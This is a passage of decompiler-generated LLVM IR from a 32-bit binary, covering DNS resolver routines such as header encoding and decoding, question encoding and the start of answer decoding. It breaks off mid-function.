dec_label_pc_8066be5:                             ; preds = %dec_label_pc_8066b7a, %dec_label_pc_8066bcd
  %v0_8066bf6.pre = phi i32 [ 0, %dec_label_pc_8066b7a ], [ %v0_8066bf6.pre.pre, %dec_label_pc_8066bcd ]
  br label %dec_label_pc_8066bf3

dec_label_pc_8066bea:                             ; preds = %dec_label_pc_8066b2d, %entry
  store i32 0, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066bf3

dec_label_pc_8066bee:                             ; preds = %dec_label_pc_8066b49, %dec_label_pc_8066b53
  store i32 1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8066bf3

dec_label_pc_8066bf3:                             ; preds = %dec_label_pc_8066bc4, %dec_label_pc_8066bea, %dec_label_pc_8066be5, %dec_label_pc_8066bee
  %v0_8066bf6 = phi i32 [ %v0_8066bc0.lcssa, %dec_label_pc_8066bc4 ], [ 0, %dec_label_pc_8066bea ], [ %v0_8066bf6.pre, %dec_label_pc_8066be5 ], [ 1, %dec_label_pc_8066bee ]
  store i32 %v0_8066bf6, i32* %eax.global-to-local, align 4
  %v2_8066bf9 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8066bf9, i32* %esi.global-to-local, align 4
  store i32 %v0_8066af4, i32* @edi, align 4
  store i32 %v0_8066af3, i32* @ebp, align 4
  ret i32 %v0_8066bf6

; uselistorder directives
  uselistorder i32 %v0_8066bf6, { 1, 0 }
  uselistorder i32 %v4_8066b62, { 1, 0 }
  uselistorder i32 %v2_8066b18, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i32* %v1_8066b01, { 1, 2, 0 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 8, 3, 4, 5, 6, 7, 9 }
  uselistorder i32 (i8*, i32, i32)* @__GI_memset, { 7, 75, 73, 74, 77, 41, 8, 81, 80, 79, 12, 59, 9, 10, 11, 72, 54, 3, 4, 5, 6, 82, 78, 0, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 1, 2, 66, 67, 68, 69, 70, 71, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 55, 56, 57, 58, 60, 61, 62, 63, 64, 65, 76 }
  uselistorder i64 4294967295, { 1, 2, 6, 7, 3, 4, 5, 0, 8 }
  uselistorder i32 (i32*, i32)* @xdr_u_long, { 16, 17, 18, 5, 20, 19, 15, 3, 0, 6, 7, 1, 8, 4, 12, 13, 14, 2, 9, 10, 11 }
  uselistorder i32 %arg6, { 1, 0, 2 }
  uselistorder i32 %arg3, { 3, 2, 1, 0 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8066bf3, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_8066bee, { 1, 0 }
  uselistorder label %dec_label_pc_8066be5, { 1, 0 }
  uselistorder label %dec_label_pc_8066bc4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8066bc0, { 1, 0 }
  uselistorder label %dec_label_pc_8066b9d, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8066b3a, { 1, 0 }
}

define i32 @__encode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp8 = call i8* @__decompiler_undefined_function_3()
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8066c01 = load i32, i32* @ebx, align 4
  store i32 %v0_8066c01, i32* %stack_var_-8, align 4
  store i32 %tmp9, i32* %ebx.global-to-local, align 4
  %v4_8066c09 = ptrtoint i8* %tmp8 to i32
  store i32 %v4_8066c09, i32* %esi.global-to-local, align 4
  %v7_8066c12 = icmp sgt i32 %tmp, 11
  br i1 %v7_8066c12, label %dec_label_pc_8066c18, label %dec_label_pc_8066cae

dec_label_pc_8066c18:                             ; preds = %entry
  %v1_8066c18 = add i32 %tmp9, 1
  %v2_8066c18 = inttoptr i32 %v1_8066c18 to i8*
  %v3_8066c18 = load i8, i8* %v2_8066c18, align 1
  store i8 %v3_8066c18, i8* %tmp8, align 1
  %v0_8066c1e = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c1e = inttoptr i32 %v0_8066c1e to i32*
  %v2_8066c1e = load i32, i32* %v1_8066c1e, align 4
  %v1_8066c20 = trunc i32 %v2_8066c1e to i8
  %v2_8066c20 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c20 = add i32 %v2_8066c20, 1
  %v4_8066c20 = inttoptr i32 %v3_8066c20 to i8*
  store i8 %v1_8066c20, i8* %v4_8066c20, align 1
  %v0_8066c46 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c46 = add i32 %v0_8066c46, 8
  %v2_8066c46 = inttoptr i32 %v1_8066c46 to i32*
  %v3_8066c46 = load i32, i32* %v2_8066c46, align 4
  %v1_8066c49 = mul i32 %v3_8066c46, 8
  %v2_8066c4f = or i32 %v1_8066c49, 4
  %v1_8066c51 = add i32 %v0_8066c46, 20
  %v2_8066c51 = inttoptr i32 %v1_8066c51 to i32*
  %v3_8066c51 = load i32, i32* %v2_8066c51, align 4
  %v4_8066c51 = icmp eq i32 %v3_8066c51, 0
  %v1_8066c55 = icmp eq i1 %v4_8066c51, false
  %v2_8066c55 = zext i1 %v1_8066c55 to i32
  %v2_8066c58 = or i32 %v2_8066c55, %v2_8066c4f
  %v2_8066c5a = or i32 %v2_8066c58, -126
  %v5_8066c5a = trunc i32 %v2_8066c5a to i8
  store i32 %v2_8066c5a, i32* @ecx, align 4
  %v2_8066c5c = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c5c = add i32 %v2_8066c5c, 2
  %v4_8066c5c = inttoptr i32 %v3_8066c5c to i8*
  store i8 %v5_8066c5a, i8* %v4_8066c5c, align 1
  %v0_8066c5f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c65 = add i32 %v0_8066c5f, 28
  %v2_8066c65 = inttoptr i32 %v1_8066c65 to i8*
  %v3_8066c65 = load i8, i8* %v2_8066c65, align 1
  %tmp13 = urem i8 %v3_8066c65, 16
  %v2_8066c70 = or i8 %tmp13, -128
  %v2_8066c72 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c72 = add i32 %v2_8066c72, 3
  %v4_8066c72 = inttoptr i32 %v3_8066c72 to i8*
  store i8 %v2_8066c70, i8* %v4_8066c72, align 1
  %v0_8066c75 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c75 = add i32 %v0_8066c75, 33
  %v2_8066c75 = inttoptr i32 %v1_8066c75 to i8*
  %v3_8066c75 = load i8, i8* %v2_8066c75, align 1
  %v2_8066c79 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c79 = add i32 %v2_8066c79, 4
  %v4_8066c79 = inttoptr i32 %v3_8066c79 to i8*
  store i8 %v3_8066c75, i8* %v4_8066c79, align 1
  %v0_8066c7c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c7c = add i32 %v0_8066c7c, 32
  %v2_8066c7c = inttoptr i32 %v1_8066c7c to i32*
  %v3_8066c7c = load i32, i32* %v2_8066c7c, align 4
  %v1_8066c7f = trunc i32 %v3_8066c7c to i8
  %v2_8066c7f = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c7f = add i32 %v2_8066c7f, 5
  %v4_8066c7f = inttoptr i32 %v3_8066c7f to i8*
  store i8 %v1_8066c7f, i8* %v4_8066c7f, align 1
  %v0_8066c82 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c82 = add i32 %v0_8066c82, 37
  %v2_8066c82 = inttoptr i32 %v1_8066c82 to i8*
  %v3_8066c82 = load i8, i8* %v2_8066c82, align 1
  %v2_8066c86 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c86 = add i32 %v2_8066c86, 6
  %v4_8066c86 = inttoptr i32 %v3_8066c86 to i8*
  store i8 %v3_8066c82, i8* %v4_8066c86, align 1
  %v0_8066c89 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c89 = add i32 %v0_8066c89, 36
  %v2_8066c89 = inttoptr i32 %v1_8066c89 to i32*
  %v3_8066c89 = load i32, i32* %v2_8066c89, align 4
  %v1_8066c8c = trunc i32 %v3_8066c89 to i8
  %v2_8066c8c = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c8c = add i32 %v2_8066c8c, 7
  %v4_8066c8c = inttoptr i32 %v3_8066c8c to i8*
  store i8 %v1_8066c8c, i8* %v4_8066c8c, align 1
  %v0_8066c8f = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c8f = add i32 %v0_8066c8f, 41
  %v2_8066c8f = inttoptr i32 %v1_8066c8f to i8*
  %v3_8066c8f = load i8, i8* %v2_8066c8f, align 1
  %v2_8066c93 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c93 = add i32 %v2_8066c93, 8
  %v4_8066c93 = inttoptr i32 %v3_8066c93 to i8*
  store i8 %v3_8066c8f, i8* %v4_8066c93, align 1
  %v0_8066c96 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c96 = add i32 %v0_8066c96, 40
  %v2_8066c96 = inttoptr i32 %v1_8066c96 to i32*
  %v3_8066c96 = load i32, i32* %v2_8066c96, align 4
  %v1_8066c99 = trunc i32 %v3_8066c96 to i8
  %v2_8066c99 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066c99 = add i32 %v2_8066c99, 9
  %v4_8066c99 = inttoptr i32 %v3_8066c99 to i8*
  store i8 %v1_8066c99, i8* %v4_8066c99, align 1
  %v0_8066c9c = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066c9c = add i32 %v0_8066c9c, 45
  %v2_8066c9c = inttoptr i32 %v1_8066c9c to i8*
  %v3_8066c9c = load i8, i8* %v2_8066c9c, align 1
  %v2_8066ca0 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066ca0 = add i32 %v2_8066ca0, 10
  %v4_8066ca0 = inttoptr i32 %v3_8066ca0 to i8*
  store i8 %v3_8066c9c, i8* %v4_8066ca0, align 1
  %v0_8066ca3 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8066ca3 = add i32 %v0_8066ca3, 44
  %v2_8066ca3 = inttoptr i32 %v1_8066ca3 to i32*
  %v3_8066ca3 = load i32, i32* %v2_8066ca3, align 4
  %v1_8066ca6 = trunc i32 %v3_8066ca3 to i8
  %v2_8066ca6 = load i32, i32* %esi.global-to-local, align 4
  %v3_8066ca6 = add i32 %v2_8066ca6, 11
  %v4_8066ca6 = inttoptr i32 %v3_8066ca6 to i8*
  store i8 %v1_8066ca6, i8* %v4_8066ca6, align 1
  %v2_8066cae.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_8066cae

dec_label_pc_8066cae:                             ; preds = %entry, %dec_label_pc_8066c18
  %v2_8066cae = phi i32 [ %v0_8066c01, %entry ], [ %v2_8066cae.pre, %dec_label_pc_8066c18 ]
  %v0_8066cb0 = phi i32 [ -1, %entry ], [ 12, %dec_label_pc_8066c18 ]
  store i32 %v2_8066cae, i32* %ebx.global-to-local, align 4
  ret i32 %v0_8066cb0

; uselistorder directives
  uselistorder i32 45, { 8, 1, 9, 3, 0, 4, 5, 6, 7, 10, 2 }
  uselistorder i32 41, { 1, 0 }
  uselistorder i32 37, { 3, 0, 1, 2, 4 }
  uselistorder i32 33, { 6, 5, 7, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_8066cae, { 1, 0 }
}

define i32 @__decode_header() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i8* @__decompiler_undefined_function_3()
  %stack_var_-4 = alloca i32, align 4
  %v0_8066cb4 = load i32, i32* @ebx, align 4
  store i32 %v0_8066cb4, i32* %stack_var_-4, align 4
  %v4_8066cb5 = ptrtoint i8* %tmp2 to i32
  store i32 %v4_8066cb5, i32* @ecx, align 4
  store i32 %tmp, i32* %ebx.global-to-local, align 4
  %v2_8066cbd = load i8, i8* %tmp2, align 1
  %v3_8066cbd = zext i8 %v2_8066cbd to i32
  %v1_8066cc0 = add i32 %v4_8066cb5, 1
  %v2_8066cc0 = inttoptr i32 %v1_8066cc0 to i8*
  %v3_8066cc0 = load i8, i8* %v2_8066cc0, align 1
  %v4_8066cc0 = zext i8 %v3_8066cc0 to i32
  %v2_8066cc4 = mul nuw nsw i32 %v3_8066cbd, 256
  %v2_8066cc7 = or i32 %v4_8066cc0, %v2_8066cc4
  %v2_8066cc9 = inttoptr i32 %tmp to i32*
  store i32 %v2_8066cc7, i32* %v2_8066cc9, align 4
  %v0_8066ccb = load i32, i32* @ecx, align 4
  %v1_8066ccb = add i32 %v0_8066ccb, 2
  %v2_8066ccb = inttoptr i32 %v1_8066ccb to i8*
  %v3_8066ccb = load i8, i8* %v2_8066ccb, align 1
  %tmp6 = icmp slt i8 %v3_8066ccb, 0
  %v2_8066ccf = zext i1 %tmp6 to i32
  %v1_8066cd2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066cd2 = add i32 %v1_8066cd2, 4
  %v3_8066cd2 = inttoptr i32 %v2_8066cd2 to i32*
  store i32 %v2_8066ccf, i32* %v3_8066cd2, align 4
  %v0_8066cd5 = load i32, i32* @ecx, align 4
  %v1_8066cd5 = add i32 %v0_8066cd5, 2
  %v2_8066cd5 = inttoptr i32 %v1_8066cd5 to i8*
  %v3_8066cd5 = load i8, i8* %v2_8066cd5, align 1
  %v3_8066cd8 = udiv i8 %v3_8066cd5, 8
  %tmp7 = urem i8 %v3_8066cd8, 16
  %v1_8066cdb = zext i8 %tmp7 to i32
  %v1_8066cde = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066cde = add i32 %v1_8066cde, 8
  %v3_8066cde = inttoptr i32 %v2_8066cde to i32*
  store i32 %v1_8066cdb, i32* %v3_8066cde, align 4
  %v0_8066ce1 = load i32, i32* @ecx, align 4
  %v1_8066ce1 = add i32 %v0_8066ce1, 2
  %v2_8066ce1 = inttoptr i32 %v1_8066ce1 to i8*
  %v3_8066ce1 = load i8, i8* %v2_8066ce1, align 1
  %div = udiv i8 %v3_8066ce1, 4
  %tmp8 = urem i8 %div, 2
  %v1_8066ce8 = zext i8 %tmp8 to i32
  %v1_8066ceb = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066ceb = add i32 %v1_8066ceb, 12
  %v3_8066ceb = inttoptr i32 %v2_8066ceb to i32*
  store i32 %v1_8066ce8, i32* %v3_8066ceb, align 4
  %v0_8066cee = load i32, i32* @ecx, align 4
  %v1_8066cee = add i32 %v0_8066cee, 2
  %v2_8066cee = inttoptr i32 %v1_8066cee to i8*
  %v3_8066cee = load i8, i8* %v2_8066cee, align 1
  %div5 = udiv i8 %v3_8066cee, 2
  %tmp9 = urem i8 %div5, 2
  %v1_8066cf4 = zext i8 %tmp9 to i32
  %v1_8066cf7 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066cf7 = add i32 %v1_8066cf7, 16
  %v3_8066cf7 = inttoptr i32 %v2_8066cf7 to i32*
  store i32 %v1_8066cf4, i32* %v3_8066cf7, align 4
  %v0_8066cfa = load i32, i32* @ecx, align 4
  %v1_8066cfa = add i32 %v0_8066cfa, 2
  %v2_8066cfa = inttoptr i32 %v1_8066cfa to i8*
  %v3_8066cfa = load i8, i8* %v2_8066cfa, align 1
  %tmp10 = urem i8 %v3_8066cfa, 2
  %v1_8066cfe = zext i8 %tmp10 to i32
  %v1_8066d01 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d01 = add i32 %v1_8066d01, 20
  %v3_8066d01 = inttoptr i32 %v2_8066d01 to i32*
  store i32 %v1_8066cfe, i32* %v3_8066d01, align 4
  %v0_8066d04 = load i32, i32* @ecx, align 4
  %v1_8066d04 = add i32 %v0_8066d04, 3
  %v2_8066d04 = inttoptr i32 %v1_8066d04 to i8*
  %v3_8066d04 = load i8, i8* %v2_8066d04, align 1
  %tmp11 = icmp slt i8 %v3_8066d04, 0
  %v2_8066d08 = zext i1 %tmp11 to i32
  %v1_8066d0b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d0b = add i32 %v1_8066d0b, 24
  %v3_8066d0b = inttoptr i32 %v2_8066d0b to i32*
  store i32 %v2_8066d08, i32* %v3_8066d0b, align 4
  %v0_8066d0e = load i32, i32* @ecx, align 4
  %v1_8066d0e = add i32 %v0_8066d0e, 3
  %v2_8066d0e = inttoptr i32 %v1_8066d0e to i8*
  %v3_8066d0e = load i8, i8* %v2_8066d0e, align 1
  %tmp12 = urem i8 %v3_8066d0e, 16
  %v1_8066d12 = zext i8 %tmp12 to i32
  %v1_8066d15 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d15 = add i32 %v1_8066d15, 28
  %v3_8066d15 = inttoptr i32 %v2_8066d15 to i32*
  store i32 %v1_8066d12, i32* %v3_8066d15, align 4
  %v0_8066d18 = load i32, i32* @ecx, align 4
  %v1_8066d18 = add i32 %v0_8066d18, 4
  %v2_8066d18 = inttoptr i32 %v1_8066d18 to i8*
  %v3_8066d18 = load i8, i8* %v2_8066d18, align 1
  %v4_8066d18 = zext i8 %v3_8066d18 to i32
  %v1_8066d1c = add i32 %v0_8066d18, 5
  %v2_8066d1c = inttoptr i32 %v1_8066d1c to i8*
  %v3_8066d1c = load i8, i8* %v2_8066d1c, align 1
  %v4_8066d1c = zext i8 %v3_8066d1c to i32
  %v2_8066d20 = mul nuw nsw i32 %v4_8066d18, 256
  %v2_8066d23 = or i32 %v4_8066d1c, %v2_8066d20
  %v1_8066d25 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d25 = add i32 %v1_8066d25, 32
  %v3_8066d25 = inttoptr i32 %v2_8066d25 to i32*
  store i32 %v2_8066d23, i32* %v3_8066d25, align 4
  %v0_8066d28 = load i32, i32* @ecx, align 4
  %v1_8066d28 = add i32 %v0_8066d28, 6
  %v2_8066d28 = inttoptr i32 %v1_8066d28 to i8*
  %v3_8066d28 = load i8, i8* %v2_8066d28, align 1
  %v4_8066d28 = zext i8 %v3_8066d28 to i32
  %v1_8066d2c = add i32 %v0_8066d28, 7
  %v2_8066d2c = inttoptr i32 %v1_8066d2c to i8*
  %v3_8066d2c = load i8, i8* %v2_8066d2c, align 1
  %v4_8066d2c = zext i8 %v3_8066d2c to i32
  %v2_8066d30 = mul nuw nsw i32 %v4_8066d28, 256
  %v2_8066d33 = or i32 %v4_8066d2c, %v2_8066d30
  %v1_8066d35 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d35 = add i32 %v1_8066d35, 36
  %v3_8066d35 = inttoptr i32 %v2_8066d35 to i32*
  store i32 %v2_8066d33, i32* %v3_8066d35, align 4
  %v0_8066d38 = load i32, i32* @ecx, align 4
  %v1_8066d38 = add i32 %v0_8066d38, 8
  %v2_8066d38 = inttoptr i32 %v1_8066d38 to i8*
  %v3_8066d38 = load i8, i8* %v2_8066d38, align 1
  %v4_8066d38 = zext i8 %v3_8066d38 to i32
  %v1_8066d3c = add i32 %v0_8066d38, 9
  %v2_8066d3c = inttoptr i32 %v1_8066d3c to i8*
  %v3_8066d3c = load i8, i8* %v2_8066d3c, align 1
  %v4_8066d3c = zext i8 %v3_8066d3c to i32
  %v2_8066d40 = mul nuw nsw i32 %v4_8066d38, 256
  %v2_8066d43 = or i32 %v4_8066d3c, %v2_8066d40
  %v1_8066d45 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d45 = add i32 %v1_8066d45, 40
  %v3_8066d45 = inttoptr i32 %v2_8066d45 to i32*
  store i32 %v2_8066d43, i32* %v3_8066d45, align 4
  %v0_8066d48 = load i32, i32* @ecx, align 4
  %v1_8066d48 = add i32 %v0_8066d48, 10
  %v2_8066d48 = inttoptr i32 %v1_8066d48 to i8*
  %v3_8066d48 = load i8, i8* %v2_8066d48, align 1
  %v4_8066d48 = zext i8 %v3_8066d48 to i32
  %v1_8066d4c = add i32 %v0_8066d48, 11
  %v2_8066d4c = inttoptr i32 %v1_8066d4c to i8*
  %v3_8066d4c = load i8, i8* %v2_8066d4c, align 1
  %v4_8066d4c = zext i8 %v3_8066d4c to i32
  %v2_8066d50 = mul nuw nsw i32 %v4_8066d48, 256
  %v2_8066d53 = or i32 %v4_8066d4c, %v2_8066d50
  %v1_8066d55 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8066d55 = add i32 %v1_8066d55, 44
  %v3_8066d55 = inttoptr i32 %v2_8066d55 to i32*
  store i32 %v2_8066d53, i32* %v3_8066d55, align 4
  %v2_8066d5d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8066d5d, i32* @ebx, align 4
  ret i32 12

; uselistorder directives
  uselistorder i8* %tmp2, { 1, 0 }
  uselistorder i32 40, { 32, 33, 38, 19, 40, 35, 36, 37, 22, 23, 24, 25, 26, 20, 39, 13, 14, 34, 28, 12, 31, 1, 2, 30, 41, 42, 43, 44, 21, 27, 3, 0, 15, 16, 17, 18, 29, 4, 5, 10, 11, 6, 9, 8, 7 }
  uselistorder i32 28, { 75, 76, 93, 95, 104, 105, 106, 85, 78, 79, 2, 80, 81, 82, 83, 84, 4, 5, 6, 0, 49, 50, 51, 52, 53, 54, 7, 42, 43, 44, 94, 35, 36, 96, 77, 71, 72, 55, 56, 34, 107, 63, 3, 14, 57, 58, 74, 45, 46, 19, 20, 8, 9, 86, 87, 88, 89, 90, 97, 98, 99, 100, 101, 102, 1, 103, 110, 91, 59, 108, 109, 60, 61, 62, 111, 112, 64, 65, 37, 38, 21, 39, 40, 41, 66, 67, 47, 48, 115, 116, 113, 114, 10, 68, 12, 69, 11, 70, 22, 23, 73, 15, 24, 26, 25, 27, 29, 28, 30, 32, 31, 33, 18, 16, 17, 13, 92 }
  uselistorder i8 2, { 0, 1, 2, 3, 6, 7, 8, 38, 9, 37, 23, 41, 42, 10, 43, 11, 12, 13, 14, 39, 40, 15, 29, 16, 17, 4, 30, 31, 32, 18, 19, 33, 34, 20, 21, 22, 5, 24, 28, 35, 25, 36, 26, 27 }
  uselistorder i8 4, { 0, 1, 4, 5, 3, 6, 7, 2 }
  uselistorder i8 16, { 0, 1, 2, 9, 10, 6, 3, 8, 4, 11, 7, 5 }
  uselistorder i8 8, { 0, 1, 4, 3, 2, 5, 6, 7 }
}

define i32 @__encode_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %v0_8066d60 = load i32, i32* @edi, align 4
  %v0_8066d61 = load i32, i32* @esi, align 4
  %v0_8066d62 = load i32, i32* @ebx, align 4
  store i32 %v0_8066d62, i32* %stack_var_-12, align 4
  store i32 %tmp3, i32* @esi, align 4
  store i32 %tmp2, i32* @edi, align 4
  store i32 %tmp, i32* @ebx, align 4
  %v0_8066d6f = load i32, i32* @eax, align 4
  %v1_8066d72 = inttoptr i32 %tmp3 to i32*
  %v2_8066d72 = load i32, i32* %v1_8066d72, align 4
  %v7_8066d74 = inttoptr i32 %v2_8066d72 to i8*
  %v8_8066d74 = call i32 @__encode_dotted(i8* %v7_8066d74, i32 %tmp2, i32 %tmp, i32 %v0_8066d6f, i32 %v0_8066d62, i32 %v0_8066d61, i32 %v0_8066d60)
  store i32 %v8_8066d74, i32* @ecx, align 4
  %v2_8066d7e = icmp slt i32 %v8_8066d74, 0
  br i1 %v2_8066d7e, label %dec_label_pc_8066dad, label %dec_label_pc_8066d82

dec_label_pc_8066d82:                             ; preds = %entry
  %v0_8066d82 = load i32, i32* @ebx, align 4
  %v2_8066d82 = sub i32 %v0_8066d82, %v8_8066d74
  %v1_8066d84 = add i32 %v2_8066d82, -3
  %v6_8066d84 = sub i32 2, %v2_8066d82
  %v7_8066d84 = and i32 %v6_8066d84, %v2_8066d82
  %v8_8066d84 = icmp slt i32 %v7_8066d84, 0
  %v9_8066d84 = icmp eq i32 %v1_8066d84, 0
  %v10_8066d84 = icmp slt i32 %v1_8066d84, 0
  %v3_8066d87 = icmp eq i1 %v10_8066d84, %v8_8066d84
  %v4_8066d87 = icmp eq i1 %v9_8066d84, false
  %v5_8066d87 = and i1 %v4_8066d87, %v3_8066d87
  br i1 %v5_8066d87, label %dec_label_pc_8066d8e, label %dec_label_pc_8066d89

dec_label_pc_8066d89:                             ; preds = %dec_label_pc_8066d82
  store i32 -1, i32* @ecx, align 4
  br label %dec_label_pc_8066dad

dec_label_pc_8066d8e:                             ; preds = %dec_label_pc_8066d82
  %v0_8066d8e = load i32, i32* @edi, align 4
  %v2_8066d8e = add i32 %v0_8066d8e, %v8_8066d74
  store i32 %v2_8066d8e, i32* @edx, align 4
  %v1_8066d91 = add i32 %v8_8066d74, 4
  store i32 %v1_8066d91, i32* @ecx, align 4
  %v0_8066d94 = load i32, i32* @esi, align 4
  %v1_8066d94 = add i32 %v0_8066d94, 5
  %v2_8066d94 = inttoptr i32 %v1_8066d94 to i8*
  %v3_8066d94 = load i8, i8* %v2_8066d94, align 1
  %v3_8066d98 = inttoptr i32 %v2_8066d8e to i8*
  store i8 %v3_8066d94, i8* %v3_8066d98, align 1
  %v0_8066d9a = load i32, i32* @esi, align 4
  %v1_8066d9a = add i32 %v0_8066d9a, 4
  %v2_8066d9a = inttoptr i32 %v1_8066d9a to i32*
  %v3_8066d9a = load i32, i32* %v2_8066d9a, align 4
  %v1_8066d9d = trunc i32 %v3_8066d9a to i8
  %v2_8066d9d = load i32, i32* @edx, align 4
  %v3_8066d9d = add i32 %v2_8066d9d, 1
  %v4_8066d9d = inttoptr i32 %v3_8066d9d to i8*
  store i8 %v1_8066d9d, i8* %v4_8066d9d, align 1
  %v0_8066da0 = load i32, i32* @esi, align 4
  %v1_8066da0 = add i32 %v0_8066da0, 9
  %v2_8066da0 = inttoptr i32 %v1_8066da0 to i8*
  %v3_8066da0 = load i8, i8* %v2_8066da0, align 1
  %v2_8066da4 = load i32, i32* @edx, align 4
  %v3_8066da4 = add i32 %v2_8066da4, 2
  %v4_8066da4 = inttoptr i32 %v3_8066da4 to i8*
  store i8 %v3_8066da0, i8* %v4_8066da4, align 1
  %v0_8066da7 = load i32, i32* @esi, align 4
  %v1_8066da7 = add i32 %v0_8066da7, 8
  %v2_8066da7 = inttoptr i32 %v1_8066da7 to i32*
  %v3_8066da7 = load i32, i32* %v2_8066da7, align 4
  %v1_8066daa = trunc i32 %v3_8066da7 to i8
  %v2_8066daa = load i32, i32* @edx, align 4
  %v3_8066daa = add i32 %v2_8066daa, 3
  %v4_8066daa = inttoptr i32 %v3_8066daa to i8*
  store i8 %v1_8066daa, i8* %v4_8066daa, align 1
  %v0_8066dad.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8066dad

dec_label_pc_8066dad:                             ; preds = %entry, %dec_label_pc_8066d89, %dec_label_pc_8066d8e
  %v0_8066dad = phi i32 [ %v8_8066d74, %entry ], [ -1, %dec_label_pc_8066d89 ], [ %v0_8066dad.pre, %dec_label_pc_8066d8e ]
  %v2_8066daf = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8066daf, i32* @ebx, align 4
  store i32 %v0_8066d60, i32* @edi, align 4
  ret i32 %v0_8066dad

; uselistorder directives
  uselistorder i32 %v1_8066d84, { 1, 0 }
  uselistorder i32 %v2_8066d82, { 0, 2, 1 }
  uselistorder i32 %v8_8066d74, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 -3, { 8, 4, 14, 7, 0, 1, 5, 12, 6, 13, 9, 10, 11, 2, 3 }
  uselistorder label %dec_label_pc_8066dad, { 2, 1, 0 }
}

define i32 @__length_question() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp2 = call i32 @__decompiler_undefined_function_0()
  %v2_8066dbf = call i32 @__length_dotted(i32 %tmp, i32 %tmp2)
  %v2_8066dc7 = icmp slt i32 %v2_8066dbf, 0
  br i1 %v2_8066dc7, label %dec_label_pc_8066dce, label %dec_label_pc_8066dcb

dec_label_pc_8066dcb:                             ; preds = %entry
  %v1_8066dcb = add i32 %v2_8066dbf, 4
  br label %dec_label_pc_8066dce

dec_label_pc_8066dce:                             ; preds = %entry, %dec_label_pc_8066dcb
  %v0_8066dd1 = phi i32 [ %v2_8066dbf, %entry ], [ %v1_8066dcb, %dec_label_pc_8066dcb ]
  ret i32 %v0_8066dd1

; uselistorder directives
  uselistorder label %dec_label_pc_8066dce, { 1, 0 }
}

define i32 @__decode_answer() local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8066dd4 = load i32, i32* @ebp, align 4
  %v0_8066dd5 = load i32, i32* @edi, align 4
  %v0_8066dd6 = load i32, i32* @esi, align 4
  %v0_8066dd7 = load i32, i32* @ebx, align 4
  store i32 %v0_8066dd7, i32* %stack_var_-16, align 4
  store i32 %tmp7, i32* @ebx, align 4
  %v2_8066df8 = ptrtoint i32* %stack_var_-272 to i32
  %v4_8066e05 = call i32 @__decode_dotted(i32 %tmp4, i32 %tmp7, i32 %v2_8066df8, i32 256)
  store i32 %v4_8066e05, i32* @edi, align 4
  %v3_8066e0f = icmp slt i32 %v4_8066e05, 0
  br i1 %v3_8066e0f, label %dec_label_pc_8066ec0, label %dec_label_pc_8066e17

dec_label_pc_8066e17:                             ; preds = %entry
  %v0_8066e17 = load i32, i32* @ebx, align 4
